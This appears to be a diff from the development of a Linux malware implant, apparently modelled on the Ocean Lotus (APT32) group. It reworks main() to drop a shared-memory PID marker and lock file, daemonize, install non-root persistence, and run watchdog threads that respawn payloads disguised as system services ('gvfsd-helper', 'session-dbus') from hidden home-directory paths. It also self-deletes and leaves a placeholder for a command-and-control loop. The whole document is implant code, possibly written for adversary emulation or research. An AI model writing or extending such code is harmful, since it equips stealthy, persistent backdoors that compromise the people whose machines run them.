@@ -16,34 +16,33 @@ int main(int argc, char *argv[]) {
     #endif
 
     pid_t id = getuid();
-    int pid = getpid();
 
-    // TODO: session_dbus_file_write
-    create_lock();
+    // TODO: *fpath = session_dbus_file_write
 
-    // Creating shared mem w/ unique key
-    // File /proc/sysvipc/shm contains the memory key artifacts.
-    // this hardcoded key is used by Ocean Lotus
-    int fd = shmget(0x64b2e2,  8, IPC_CREAT | 0666);
-    if (fd < 0) {
+    // Spawn session-dbus (monitor)
+    if (access("/home/gdev/.X11/X0-lock", F_OK) == 0) {
+
+        if (id != 0 ) { // non-root
+            //daemon(0, 0);
+            printf("initial spawn of session-dbus\n");
+            spawn_thread_watchdog(0, "/home/gdev/.dbus/.sessions/session-dbus");
+        }
+        do {
+            sleep(10);
+        } while(true);
+
+    } else {
         #ifdef DEBUG
-        fprintf(stderr, "error creating shared mem: %s", strerror(errno));
+        fprintf(stderr, "First time running, creating lock!");
         #endif
-        return -1;
+        create_lock();  // lock file created, when gvfspd spawns session-dbus, the top loop will run forever.
     }
-    void *addr = shmat(fd, NULL, 0);
-    char *c_pid = (char *)malloc(sizeof(int));
-    memset(c_pid, 0, sizeof(int));
-    sprintf(c_pid, "%d", pid); // copy int pid to char* c_pid.
-    memcpy(addr, c_pid, 8); // writing PID to shared mem.
 
-    //debugging current pid vs pid in shared mem
-    #ifdef DEBUG
-    printf("PID is: %d\n", getpid());
-    printf("PID written to sharedmem: %s\n", (char *)addr);
-    #endif
-
-
+    bool desktop_res = nonroot_persistence();
+    if (desktop_res == false ) {
+        fprintf(stderr, "[main] Error creating non-root persistence: %s",strerror(errno));
+        exit(1);
+    }
     // if root do ....
     if (id == 0) {
         //daemon(0, 0);  // detach from current console
@@ -51,38 +50,15 @@ int main(int argc, char *argv[]) {
 
     } else { // non-root user....
 
+        daemon(0, 0);  // detach from current console
         // spawns -> /home/$USER/.gvfsd/.profile/gvfsd-helper
+        //printf("initial spawn of gvfsd-helper\n");
         spawn_thread_watchdog(1, "/home/gdev/.gvfsd/.profile/gvfsd-helper");
-        bool desktop_res = nonroot_desktop_persistence();
-        if (desktop_res == false ) {
-            #ifdef DEBUG
-            fprintf(stderr, "[main] Error creating nonroot desktop persistence: %s",
-                    strerror(errno));
-            #endif
-        }
-
-        bool bashrc_res = nonroot_bashrc_persistence();
-        if (bashrc_res == false) {
-            #ifdef DEBUG
-            fprintf(stderr, "[main] Error creating bashrc desktop persistence: %s",
-                    strerror(errno));
-            #endif
-        }
-
-        // spawns -> /home/$USER/.dbus/sessions/session-dbus
-        spawn_thread_watchdog(1, "/home/gdev/.dbus/sessions/session-dbus");
     }
 
     #ifndef DEBUG
     self_delete(argv[0]); //  deleting this binary.
     #endif
-
-    while(1) {
-       //daemon(0, 0); // detach from current terminal
-       sleep(30); // keep process running in background as "daemon".
-   }
-
-    // TODO: main_c2_loop goes here.
-    free(c_pid);
+    // TODO: main_c2_loop goes here (gvfsd-helper).
     return 0;
-}
+ }
